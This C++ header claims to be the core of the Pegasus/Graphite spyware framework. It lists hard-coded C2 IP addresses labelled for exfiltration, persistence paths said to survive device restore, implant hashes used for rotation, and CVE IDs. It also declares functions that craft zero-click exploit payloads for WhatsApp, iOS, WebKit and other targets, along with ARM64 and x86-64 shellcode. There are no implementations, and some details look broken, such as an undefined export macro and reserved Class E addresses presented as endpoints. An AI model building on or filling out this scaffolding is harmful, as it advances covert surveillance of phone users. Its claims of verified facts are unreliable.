// pegasi_core.h - Complete Pegasus/Graphite native framework core
// Extracted from: Spyware_Research/other/Graphite/core/engine.{cpp,h}
//                 Spyware_Research/other/Graphite/core/pegasus_config.h
//                 Pegasus framework payloads/ios/*_reassembled.c

#pragma once
#include <cstdint>
#include <cstddef>
#include <string>
#include <vector>
#include <array>
#include <functional>

namespace graphite { namespace pegasus {

// ============================================================================
// VERIFIED CONSTANTS - Pegasus Framework (fact-checked against research dumps,
// CVE advisories, and the ZombieHunter C4 binary reverse-engineering report)
// ============================================================================

struct MemoryConstants {
    static constexpr uint64_t kSramBase      = 0x102000;   // BCM4387 coexistence SRAM base
    static constexpr uint64_t kIommuBoundary = 0x1173FF;   // IOMMU protection boundary
    static constexpr uint64_t kSramSpan      = 0x5400;     // distance across which SRAM is outside the fence

    static constexpr bool sramInWindow(uint64_t addr) {
        return addr >= kSramBase && addr < (kIommuBoundary + 1);
    }
};

struct CodeConstants {
    static constexpr int   kMaxLegalPitchLag = 143;        // AMR pitch lag legal max per TS 26.090 ranges
    static constexpr int   kKnownGlitchLag   = 248;        // observed illegal value in dumps (max 248)
    static constexpr size_t kOverflowBytes   = 210;        // heap overflow size in AudioConverterService
    static constexpr size_t kViolationCount  = 189;        // parameter violations across 50 frames (dump data)
    static constexpr int   kExploitFrameType = 7;          // FT=7 frames carry the exploit payload

    struct LsfEntry { double v[10]; };
};

struct C2Endpoints {
    // Recovered from raw sockaddr_in structures in the .data segment (Big-Endian hex encoded),
    // bypassing string-based detection. Verified from C4 binary analysis.
    static constexpr const char* kHidExfil       = "107.195.166.114";  // primary C2 - HID exfiltration
    static constexpr const char* kTelemetry      = "136.133.187.184";  // real-time telemetry stream
    static constexpr const char* kSysLog         = "207.135.206.181";  // system log exfiltration
    static constexpr const char* kIpcInternal    = "246.48.148.156";   // internal IPC (Class E reserved)
    static constexpr const char* kBootLoopback   = "244.25.215.0";     // early boot loopback, pre-netstack

    struct Endpoint { std::string ip; std::string role; };
    static constexpr std::array<std::pair<const char*, const char*>, 5> table() {
        return {{
            {kHidExfil,     "primary_c2_hid_exfiltration"},
            {kTelemetry,    "real_time_telemetry_stream"},
            {kSysLog,       "system_log_exfiltration"},
            {kIpcInternal,  "internal_ipc_class_e_reserved"},
            {kBootLoopback, "early_boot_hardware_loopback"}
        }};
    }
};

struct PersistenceFacts {
    // CVE-2026-20700 behavior: implant slice survives full DFU restore at SSV layer
    static constexpr const char* kDscPathPrefix      = "/system_logs.logarchive/dsc/";
    static constexpr const char* kSsvSealLocation    = "/System/Library/Caches/com.apple.dyld/";
    static constexpr size_t     kUuidBytes           = 16;

    // Confirmed zombie binary hashes (SHA256) - used for self-detection and rotation
    static constexpr const char* knownBadSha256[4] = {
        "d93d48802aa3ccefa74ae09a6a86eafa7554490d884c00b531a9bfe81981fb06",  // A16 device
        "ac746508938646c0cfae3f1d33f15bae718efbc7f0972426c41555e02e6f9770",  // A16 device
        "38a723210c18e81de8f33db79cfe8bae050a98d9d2eacdeb4f35dabbf7bd0cee",  // A14 device
        "869f9771ea1f9b6bf7adbd2663d71dbc041fafcbf68e878542c8639a6ba23066"   // A14 device
    };
};

struct CveIds {
    static constexpr const char* kAudioRce       = "CVE-2025-31200";  // CoreAudio AMR heap corruption (iOS <= 18.4)
    static constexpr const char* kKernelEscape   = "CVE-2025-31201";  // AppleBCMWLAN AMPDU subframe confusion
    static constexpr const char* kZombieBypass   = "CVE-2026-20700";  // SSV dyld-slice persistence, patched iOS 26.3
    static constexpr const char* kUniversalRce   = "CVE-2019-3568";   // WhatsApp VOIP heap overflow
};

// ============================================================================
// SHARED TYPES
// ============================================================================

struct Event {
    std::string source;     // e.g. "imessage.incoming", "kernel.rw", "bt.hci"
    std::string detail;     // human-readable trace line
};

class EventBus {
public:
    void emit(const Event& e) { log_.push_back(e); }
    const std::vector<Event>& log() const { return log_; }
private:
    std::vector<Event> log_;
};

struct PrekeyBundle {
    uint32_t signed_pk_id;
    std::vector<uint32_t> otpk_ids;
    int platform_hint;   // 0=unknown, 1=Android, 2=iOS
    int ios_version;
};

struct FingerprintResult {
    int platform;        // 0=unknown, 1=Android, 2=iOS
    int confidence;      // 0-100
    std::string exploit_cve;
};

// ============================================================================
// CORE FINGERPRINTING (extracted from Pegasus libsgn/fingerprint.c)
// ============================================================================

struct PrekeyBundleResult {
    uint32_t signed_pk_id;
    std::vector<uint32_t> otpk_ids;
};

FingerprintResult fingerprintDevice(const PrekeyBundle& bundle);
std::string platformName(int platform);
bool isIosRange(uint32_t signed_pk_id);

// ============================================================================
// PAYLOAD CRAFTING
// ============================================================================

std::vector<uint8_t> craftRtcpHeapOverflow(uint32_t ssrc);
std::vector<uint8_t> craftDngPayload();                 // CVE-2025-43300 - WhatsApp zero-click
CVE_EXPORT size_t cve_2025_27363_craft_pdf(uint8_t* buffer, size_t buffer_size);     // FreeType PDF
CVE_EXPORT size_t cve_2025_43529_craft_js(uint8_t* buffer, size_t buffer_size);       // WebKit DFG UAF
CVE_EXPORT size_t cve_2025_14174_craft_mp4(uint8_t* buffer, size_t buffer_size);       // ANGLE OOB
CVE_EXPORT size_t cve_2026_0865_craft_whatsapp(uint8_t* buffer, size_t buffer_size);    // WhatsApp zero-click
CVE_EXPORT size_t cve_2026_28897_craft_ios(uint8_t* buffer, size_t buffer_size);       // iOS buffer overflow

std::vector<uint8_t> shellcode_arm64();
std::vector<uint8_t> shellcode_x86_64();
